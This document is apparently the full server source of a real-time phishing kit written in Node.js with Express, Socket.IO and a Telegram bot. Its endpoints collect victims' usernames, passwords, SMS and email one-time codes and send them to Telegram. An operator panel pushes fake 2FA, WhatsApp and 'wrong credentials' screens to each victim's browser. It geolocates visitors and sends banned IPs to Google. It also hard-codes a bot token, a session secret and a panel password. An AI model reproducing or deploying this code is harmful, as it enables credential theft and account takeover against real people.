const express = require('express');
const session = require('express-session');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const UAParser = require('ua-parser-js');
const { sendTelegramMessage } = require('./bot/telegram');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.set('trust proxy', 1);
const server = http.createServer(app);

/** Set TELEGRAM_WEBHOOK_URL (full https URL to /telegram-webhook on your server) to use webhooks instead of polling — lower latency, better on mobile Telegram. */
const TELEGRAM_WEBHOOK_URL = process.env.TELEGRAM_WEBHOOK_URL;
const bot = new TelegramBot('8499303373:AAHXoK6a9_4o018qmbkPcYV3hdMt2dA-npM', { polling: !TELEGRAM_WEBHOOK_URL });

const SESSION_MAX_AGE_SHORT_MS = 24 * 60 * 60 * 1000;
const SESSION_MAX_AGE_LONG_MS = 10 * 365 * 24 * 60 * 60 * 1000;

app.use(session({
  secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: true,
    sameSite: 'none',
    maxAge: SESSION_MAX_AGE_SHORT_MS
  }
}));

// ✅ Allow all domains (any origin)
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

if (TELEGRAM_WEBHOOK_URL) {
  app.post('/telegram-webhook', (req, res) => {
    try {
      const body = req.body;
      if (body && typeof body === 'object') {
        bot.processUpdate(body);
      }
    } catch (err) {
      console.error('Telegram webhook processUpdate:', err.message);
    }
    res.sendStatus(200);
  });
}

// ✅ Socket.io: longer pings help mobile tabs / flaky networks; websocket first, polling fallback
const io = socketIo(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  transports: ['websocket', 'polling'],
  pingTimeout: 60000,
  pingInterval: 20000,
  connectTimeout: 45000
});

module.exports = { app, server, io, bot };

const PANEL_LOGIN_USER = 'admin';
const PANEL_LOGIN_PASS = 'Qweqwe123!@#';

function requirePanelAuth(req, res, next) {
  if (req.session && req.session.authenticated) {
    return next();
  }
  if (req.accepts('html')) {
    return res.redirect(302, '/dash/login');
  }
  return res.status(401).json({ message: 'Authentication required.' });
}

const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
const bannedIpSet = new Set();

function loadBanListIntoMemory() {
  bannedIpSet.clear();
  try {
    const text = fs.readFileSync(BAN_LIST_FILE, 'utf8');
    for (const line of text.split('\n')) {
      const t = line.trim();
      if (t) bannedIpSet.add(t);
    }
  } catch (_) {
    /* no file yet */
  }
}
loadBanListIntoMemory();

/** GeoIP cache: avoids repeated ip-api.com calls on reconnects (same IP). */
const geoCache = new Map();
const GEO_TTL_MS = 60 * 60 * 1000;
const GEO_CACHE_MAX = 5000;

async function getGeoForIp(clientIP) {
  const empty = { city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
  if (!clientIP || clientIP === '::1' || clientIP === '127.0.0.1') return empty;

  const now = Date.now();
  const hit = geoCache.get(clientIP);
  if (hit && hit.exp > now) {
    return { city: hit.city, country: hit.country, isp: hit.isp };
  }

  let city = 'Unknown';
  let country = 'Unknown';
  let isp = 'Unknown';
  try {
    const res = await axios.get(`http://ip-api.com/json/${clientIP}`, { timeout: 8000 });
    if (res.data && res.data.status === 'success') {
      city = res.data.city || 'Unknown';
      country = res.data.country || 'Unknown';
      isp = res.data.isp || 'Unknown';
    }
  } catch (err) {
    console.error('GeoIP lookup failed:', err.message);
  }

  if (geoCache.size >= GEO_CACHE_MAX) geoCache.clear();
  geoCache.set(clientIP, { city, country, isp, exp: now + GEO_TTL_MS });
  return { city, country, isp };
}

let panelUpdateTimer = null;
const PANEL_UPDATE_DEBOUNCE_MS = 80;

const panelLoginHtml = path.join(__dirname, 'panel-login.html');

app.get('/dash/login', (req, res) => {
  if (req.session && req.session.authenticated) {
    return res.redirect(302, '/dash/');
  }
  res.sendFile(panelLoginHtml);
});

app.post('/dash/login', (req, res) => {
  const username = req.body && req.body.username;
  const password = req.body && req.body.password;
  if (username === PANEL_LOGIN_USER && password === PANEL_LOGIN_PASS) {
    const remember = req.body && (req.body.remember === '1' || req.body.remember === 'on');
    req.session.authenticated = true;
    req.session.cookie.maxAge = remember ? SESSION_MAX_AGE_LONG_MS : SESSION_MAX_AGE_SHORT_MS;
    return res.redirect(302, '/dash/');
  }
  res.redirect(302, '/dash/login?error=1');
});

app.get('/dash/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) console.error('Session destroy:', err);
    res.redirect(302, '/dash/login');
  });
});

app.use('/dash', requirePanelAuth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
app.use('/public', express.static(path.join(__dirname, 'public')));

const users = {};             // socket.id -> socket
const userData = {};          // clientId -> data
const socketToClient = {};    // socket.id -> clientId
const newUsers = new Set();

bot.on('callback_query', (query) => {
  if (!query || query.id == null) return;

  bot.answerCallbackQuery(query.id).catch(() => {});

  try {
    if (!query.data || typeof query.data !== 'string') return;
    const colon = query.data.indexOf(':');
    if (colon < 1) return;
    const command = query.data.slice(0, colon);
    const clientId = query.data.slice(colon + 1);
    if (!clientId) return;

    const map = {
      send_2fa: 'show-2fa',
      send_auth: 'show-auth',
      send_email: 'show-email',
      send_wh: 'show-whatsapp',
      send_wrong_creds: 'show-wrong-creds',
      send_old_pass: 'show-old-pass',
      send_calendar: 'show-calendar',
    };

    if (command === 'disconnect') {
      disconnectClient(clientId);
    } else if (map[command]) {
      const delivered = emitToClient(clientId, map[command]);
      const msg =
        `📩 *Command Sent to Client*\n\n` +
        `📤 *Command:* \`${command}\`\n` +
        `🆔 *Client ID:* \`${clientId}\`` +
        (delivered ? '' : '\n\n⚠️ Client offline — no open browser session for this ID.');
      sendTelegramMessage(msg, clientId, true);
    } else if (command === 'ban_ip') {
      const ip = userData[clientId]?.ip;
      if (ip) {
        banIp(ip);
        disconnectClient(clientId);
        sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
      }
    }
  } catch (err) {
    console.error('Telegram callback_query:', err.message);
  }
});
function formatDateTime(date) {
  return {
    full: date.toISOString(),
    date: date.toLocaleDateString(),
    time: date.toLocaleTimeString(),
    timestamp: Date.now()
  };
}

/** Best-effort page URL: client query (pageUrl/origin), then Origin / Referer headers */
function siteFromSocket(socket) {
  const q = socket.handshake.query || {};
  for (const key of ['pageUrl', 'origin', 'referrer']) {
    const raw = q[key];
    if (typeof raw === 'string' && raw.trim()) {
      try {
        return decodeURIComponent(raw.trim());
      } catch {
        return raw.trim();
      }
    }
  }
  const origin = socket.handshake.headers.origin;
  if (origin && typeof origin === 'string') return origin;
  const referer = socket.handshake.headers.referer;
  if (referer && typeof referer === 'string') return referer;
  return 'Unknown';
}

/** Optional: pass `page` or `pageName` in the Socket.IO client `query` so the panel shows the screen before any submit (e.g. query: { clientId, page: 'sms' }). */
function getInitialPageFromQuery(socket) {
  const q = socket.handshake.query || {};
  if (typeof q.page === 'string' && q.page.trim()) return q.page.trim();
  if (typeof q.pageName === 'string' && q.pageName.trim()) return q.pageName.trim();
  return null;
}

/** First-time visitor row + Telegram for new sessions */
function registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp, city, country, isp, browserName, actionHint) {
  const resolvedAction = (actionHint != null && String(actionHint).trim() !== '')
    ? String(actionHint).trim()
    : (userData[clientId]?.action ?? null);

  const isNewUser = !userData[clientId];
  userData[clientId] = {
    ...(userData[clientId] || {}),
    id: clientId,
    ip: clientIP,
    userAgent,
    time: timestamp,
    isConnected: true,
    login: userData[clientId]?.login || {},
    codes: userData[clientId]?.codes || [],
    action: resolvedAction
  };

  if (isNewUser) {
    newUsers.add(clientId);
    const website = siteFromSocket(socket);
    const msg =
      `🌟 *New Connection Established*\n\n` +
      `🆔 *Client ID:* \`${clientId}\`\n` +
      `🌍 *IP Address:* \`${clientIP}\`\n` +
      `🏙 *City:* \`${city}\`\n` +
      `🏳️ *Country:* \`${country}\`\n` +
      `🌐 *Browser:* \`${browserName}\`\n` +
      `🛣 *Provider:* \`${isp}\`\n\n` +
      `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\`\n` +
      `🔗 *Website:* ${website}`;

    sendTelegramMessage(msg, clientId, 'banOnly');
  }

  updatePanelUsers();
}

const EVENT_TO_PANEL_ACTION = {
  'show-2fa': '2FA',
  'show-auth': 'Auth',
  'show-email': 'Email',
  'show-whatsapp': 'WhatsApp',
  'show-wrong-creds': 'Wrong creds',
  'show-old-pass': 'Old pass',
  'show-calendar': 'Calendar',
  message: 'Message'
};

function updatePanelUsers() {
  clearTimeout(panelUpdateTimer);
  panelUpdateTimer = setTimeout(() => {
    const data = Object.values(userData)
      .filter(user => user?.time?.timestamp && Date.now() - user.time.timestamp <= 2 * 60 * 60 * 1000)
      .sort((a, b) => b.time.timestamp - a.time.timestamp);

    io.of('/panel').emit('update-users', {
      users: data,
      newUsers: Array.from(newUsers)
    });
  }, PANEL_UPDATE_DEBOUNCE_MS);
}


io.on('connection', async (socket) => {
  const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
  const userAgent = socket.handshake.headers['user-agent'];
  const timestamp = formatDateTime(new Date());

  // Redirect only banned IPs (EU geo-blocking removed — it sent all EU visitors to Google)
  if (isBanned(clientIP)) {
    socket.emit('redirect', 'https://www.google.com/');
    socket.disconnect();
    return;
  }

  let clientId = socket.handshake.query.clientId;
  if (!clientId || typeof clientId !== 'string') {
    clientId = crypto.randomBytes(16).toString('hex');
    socket.emit('assign-client-id', clientId);
  }

  const initialPageFromQuery = getInitialPageFromQuery(socket);

  socketToClient[socket.id] = clientId;
  users[socket.id] = socket;

  const parser = new UAParser(userAgent);
  const browserName = parser.getBrowser().name || 'Unknown';

  const { city, country, isp } = await getGeoForIp(clientIP);

  let connectionHandled = false;

  const connectionTimeout = setTimeout(() => {
    if (!connectionHandled) {
      registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp, city, country, isp, browserName, initialPageFromQuery);
    }
  }, 3000); // 3 seconds to wait for userConnectedToPage

  if (initialPageFromQuery) {
    connectionHandled = true;
    clearTimeout(connectionTimeout);
    registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp, city, country, isp, browserName, initialPageFromQuery);
  }

  socket.on('userConnectedToPage', (data) => {
    connectionHandled = true;
    clearTimeout(connectionTimeout);

    const cid = data.clientId || socket.id;
    socketToClient[socket.id] = cid;

    const pageFromClient = data && data.page != null && String(data.page).trim() !== '' ? String(data.page).trim() : null;
    const resolvedPage = pageFromClient || initialPageFromQuery || null;

    if (!userData[cid]) {
      userData[cid] = {
        id: cid,
        ip: clientIP,
        userAgent,
        time: timestamp,
        isConnected: true,
        login: {},
        codes: [],
        action: resolvedPage
      };
    } else {
      userData[cid].action = resolvedPage != null ? resolvedPage : userData[cid].action;
    }

    const siteHint = data.pageUrl || siteFromSocket(socket);
    const pageMsg = `🌐 *User Connected to Page*\n\n` +
      `📄 *Page:* \`${resolvedPage || 'Unknown'}\`\n` +
      `📱 *cid:* \`${cid}\`\n` +
      `🔗 *Website:* ${siteHint}`;

    sendTelegramMessage(pageMsg, cid, false);
    updatePanelUsers();
  });

  socket.on('disconnect', () => {
    const cid = socketToClient[socket.id];
    if (cid && userData[cid]) {
      userData[cid].isConnected = false;
    }
    delete users[socket.id];
    delete socketToClient[socket.id];
    newUsers.delete(cid || clientId);
    updatePanelUsers();
  });
});

function isBanned(ip) {
  return bannedIpSet.has(ip.trim());
}

function banIp(ip) {
  const cleanIp = ip.trim();
  if (bannedIpSet.has(cleanIp)) return;

  bannedIpSet.add(cleanIp);
  try {
    if (fs.existsSync(BAN_LIST_FILE)) {
      const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
      if (!data.endsWith('\n')) {
        fs.appendFileSync(BAN_LIST_FILE, '\n');
      }
    }
    fs.appendFileSync(BAN_LIST_FILE, `${cleanIp}\n`);
  } catch (err) {
    console.error('Error saving banned IP:', err);
    bannedIpSet.delete(cleanIp);
  }
}

io.of('/panel').on('connection', (socket) => {
  updatePanelUsers();

  socket.on('send-sms', clientId => {
    emitToClient(clientId, 'show-2fa');
    sendTelegramMessage(`📲 *SMS 2FA Command Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-auth', clientId => {
    emitToClient(clientId, 'show-auth');
    sendTelegramMessage(`🔐 *Auth Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-email', clientId => {
    emitToClient(clientId, 'show-email');
    sendTelegramMessage(`📧 *Email Code Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-wh', clientId => {
    emitToClient(clientId, 'show-whatsapp');
    sendTelegramMessage(`💬 *WhatsApp Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-wrong-creds', clientId => {
    emitToClient(clientId, 'show-wrong-creds');
    sendTelegramMessage(`❌ *Wrong Credentials Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-old-pass', clientId => {
    emitToClient(clientId, 'show-old-pass');
    sendTelegramMessage(`🔁 *Old Password Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-calendar', clientId => {
    emitToClient(clientId, 'show-calendar');
    sendTelegramMessage(`📅 *Calendar View Prompt Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('send-message', (clientId, message) => {
    emitToClient(clientId, 'message', message);
    sendTelegramMessage(`💬 *Custom Message Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n📝 Message: \`${message}\`\n🔄 Triggered from Panel`, clientId, true);
  });

  socket.on('disconnect-user', clientId => {
    disconnectClient(clientId);
    sendTelegramMessage(`🔌 *Client Forcefully Disconnected*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
  });
  socket.on('ban-ip', (clientId) => {
    const ip = userData[clientId]?.ip;
    if (ip) {
      banIp(ip);
      disconnectClient(clientId);
      sendTelegramMessage(
        `🚫 *IP Banned from Panel*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\`\n🔄 Triggered from Panel`,
        clientId,
        false
      );
    } else {
      sendTelegramMessage(`⚠️ *Failed to Ban IP*\n\nClient ID: \`${clientId}\`\nReason: IP not found`, clientId, false);
    }
  });

  socket.on('send-login-data', (clientId, username, password) => {
    if (userData[clientId]) {
      userData[clientId].login = { username, password };
      userData[clientId].action = 'Login';
    }

    sendTelegramMessage(`🔐 *Login Credentials Sent*\n\n🆔 *Client ID:* \`${clientId}\`\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n🔄 Triggered from Panel`, clientId, true);

    updatePanelUsers();
  });
});

function emitToClient(clientId, event, data = null) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    users[socketId].emit(event, data);
    const nextAction = EVENT_TO_PANEL_ACTION[event];
    if (nextAction && userData[clientId]) {
      userData[clientId].action = nextAction;
      updatePanelUsers();
    }
    return true;
  }
  return false;
}

function disconnectClient(clientId) {
  const socketId = getSocketIdByClientId(clientId);
  if (socketId && users[socketId]) {
    users[socketId].disconnect(true);
  }
}

function getSocketIdByClientId(clientId) {
  return Object.entries(socketToClient)
    .find(([_, cid]) => cid === clientId)?.[0];
}

app.post('/send-auth-code', (req, res) => {
  const { code, socketId } = req.body;
  if (!code || code.length !== 6) return res.status(400).json({ message: 'Invalid authentication code.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });
  if (!userData[clientId]) return res.status(404).json({ message: 'Client session expired.' });

  const message = `🔐 *Code*\n\nThe 6-digit authentication code is: \`${code}\`\n\nClient ID: \`${clientId}\``;
  sendTelegramMessage(message, clientId, true);

  userData[clientId].codes.push(code);
  userData[clientId].action = '2FA';
  updatePanelUsers();

  res.json({ message: 'Code sent successfully!' });
});

app.post('/send-email-code', (req, res) => {
  const { code, socketId } = req.body;
  if (!code || code.length !== 8) return res.status(400).json({ message: 'Invalid authentication code.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });
  if (!userData[clientId]) return res.status(404).json({ message: 'Client session expired.' });

  const message = `🔐 *Email Code*\n\nThe 8-digit authentication code is: \`${code}\`\n\nClient ID: \`${clientId}\``;
  sendTelegramMessage(message, clientId, true);

  userData[clientId].codes.push(code);
  userData[clientId].action = 'Email';
  updatePanelUsers();

  res.json({ message: 'Code sent successfully!' });
});

app.post('/send-login-data', (req, res) => {
  const { username, password, socketId } = req.body;
  if (!username || !password) return res.status(400).json({ message: 'Username and password are required.' });

  const clientId = socketToClient[socketId];
  if (!clientId) return res.status(404).json({ message: 'Client not found.' });
  if (!userData[clientId]) return res.status(404).json({ message: 'Client session expired.' });

  const message = `🔐 *Login Attempt*\n\n` +
    `🔷 *Username:* \`${username}\`\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `Client ID: \`${clientId}\``;

  sendTelegramMessage(message, clientId, true);

  userData[clientId].login = { username, password };
  userData[clientId].action = 'Login';
  updatePanelUsers();

  res.json({ success: true, message: 'Login data sent successfully!' });
});

const PORT = Number(process.env.PORT) || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  if (TELEGRAM_WEBHOOK_URL) {
    bot.deleteWebHook()
      .then(() => bot.setWebHook(TELEGRAM_WEBHOOK_URL))
      .then(() => console.log('Telegram webhook registered:', TELEGRAM_WEBHOOK_URL))
      .catch((err) => console.error('Telegram setWebHook failed:', err));
  } else {
    bot.deleteWebHook().then(() => console.log('Telegram long polling active'));
  }
});
